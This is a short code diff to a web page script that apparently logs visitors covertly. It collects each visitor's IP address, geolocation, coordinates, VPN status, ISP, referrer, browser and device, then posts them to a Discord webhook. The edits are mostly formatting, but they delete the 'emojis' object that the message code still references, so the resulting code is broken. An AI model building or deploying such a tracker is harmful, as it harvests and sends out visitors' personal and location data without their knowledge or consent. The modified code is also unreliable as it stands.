@@ -46,7 +46,7 @@
                 userInformation.time = new Date().toLocaleTimeString();
                 userInformation.referringURL = document.referrer;
                 userInformation.browser = navigator.userAgent;
-                userInformation.device = geoInfo.device_type;
+               userInformation.device = geoInfo.device;
 
                 sendToDiscord(userInformation, discordWebhook);
             });
@@ -57,14 +57,7 @@
         const request = new XMLHttpRequest();
         request.open("POST", webhookURL);
 
-        const emojis = {
-            location: '🌍',
-            vpn: '🛡️',
-            calendar: '📅',
-            clock: '🕒',
-            link: '🔗',
-            computer: '💻',
-        };
+     
 
         const messageContent = `**${emojis.location} IP Address:** ${data.ip_address}\n` +
             `**🔗 Current URL:** ${data.current_url}\n` +
@@ -72,7 +65,7 @@
             `**🏞️ Region:** ${data.region}\n` +
             `**🌐 Country:** ${data.country} (${data.country_code})\n` +
             `**🌍 Continent:** ${data.continent} (${data.continent_code})\n` +
-            `**"🗺️ Longitude/Latitude:** ${data.longitude}, ${data.latitude}\n` +
+            `**🗺️ Longitude/Latitude:** ${data.longitude}, ${data.latitude}\n` +
             `**🛡️ VPN Status:** ${data.security_vpn ? 'Using VPN' : 'Not Using VPN'}\n` +
             `**🇳🇱 Flag:** ${data.flag}\n` +
             `**🏢 ISP:** ${data.isp_name}\n` +
@@ -81,8 +74,7 @@
             `**⌚ Time:** ${data.time}\n` +
             `**🌐 Referring URL:** ${data.referringURL}\n` +
             `**🌐 Browser:** ${data.browser}\n` +
-            `**💻 Device:** ${data.device}`;
-
+             `**💻 Device:** ${data.device}`;
         const message = JSON.stringify({ content: messageContent });
 
         request.setRequestHeader('Content-type', 'application/json');
